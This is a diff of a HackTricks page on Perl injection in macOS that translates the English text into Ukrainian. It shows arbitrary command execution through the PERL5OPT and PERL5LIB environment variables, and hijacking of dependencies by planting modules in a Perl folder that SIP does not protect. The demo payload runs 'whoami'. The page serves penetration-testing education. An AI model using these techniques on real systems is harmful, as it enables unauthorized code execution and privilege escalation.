@@ -2,48 +2,37 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Via `PERL5OPT` & `PERL5LIB` env variable
+## Через змінну середовища `PERL5OPT` & `PERL5LIB`
 
-Using the env variable PERL5OPT it's possible to make perl execute arbitrary commands.\
-For example, create this script:
-
+Використовуючи змінну середовища PERL5OPT, можна змусити perl виконувати довільні команди.\
+Наприклад, створіть цей скрипт:
 ```perl:test.pl
 #!/usr/bin/perl
 print "Hello from the Perl script!\n";
 ```
-
-Now **export the env variable** and execute the **perl** script:
-
+Тепер **експортуйте змінну середовища** та виконайте **perl** скрипт:
 ```bash
 export PERL5OPT='-Mwarnings;system("whoami")'
 perl test.pl # This will execute "whoami"
 ```
-
-Another option is to create a Perl module (e.g. `/tmp/pmod.pm`):
-
+Інший варіант - створити модуль Perl (наприклад, `/tmp/pmod.pm`):
 ```perl:/tmp/pmod.pm
 #!/usr/bin/perl
 package pmod;
 system('whoami');
 1; # Modules must return a true value
 ```
-
-And then use the env variables:
-
+А потім використовуйте змінні середовища:
 ```bash
 PERL5LIB=/tmp/ PERL5OPT=-Mpmod
 ```
+## Через залежності
 
-## Via dependencies
-
-It's possible to list the dependencies folder order of Perl running:
-
+Можливо перерахувати порядок папки залежностей, що виконується Perl:
 ```bash
 perl -e 'print join("\n", @INC)'
 ```
-
-Which will return something like:
-
+Що поверне щось на зразок:
 ```bash
 /Library/Perl/5.30/darwin-thread-multi-2level
 /Library/Perl/5.30
@@ -55,15 +44,14 @@ Which will return something like:
 /System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
 /System/Library/Perl/Extras/5.30
 ```
-
-Some of the returned folders doesn't even exist, however, **`/Library/Perl/5.30`** does **exist**, it's **not** **protected** by **SIP** and it's **before** the folders **protected by SIP**. Therefore, someone could abuse that folder to add script dependencies in there so a high privilege Perl script will load it.
+Деякі з повернених папок навіть не існують, однак, **`/Library/Perl/5.30`** **існує**, вона **не** **захищена** **SIP** і знаходиться **перед** папками, **захищеними SIP**. Тому хтось міг би зловживати цією папкою, щоб додати залежності скриптів, щоб скрипт Perl з високими привілеями міг його завантажити.
 
 > [!WARNING]
-> However, note that you **need to be root to write in that folder** and nowadays you will get this **TCC prompt**:
+> Однак зверніть увагу, що вам **потрібно бути root, щоб записувати в цю папку** і в наші дні ви отримаєте цей **TCC prompt**:
 
 <figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>
 
-For example, if a script is importing **`use File::Basename;`** it would be possible to create `/Library/Perl/5.30/File/Basename.pm` to make it execute arbitrary code.
+Наприклад, якщо скрипт імпортує **`use File::Basename;`**, буде можливим створити `/Library/Perl/5.30/File/Basename.pm`, щоб виконати довільний код.
 
 ## References
 
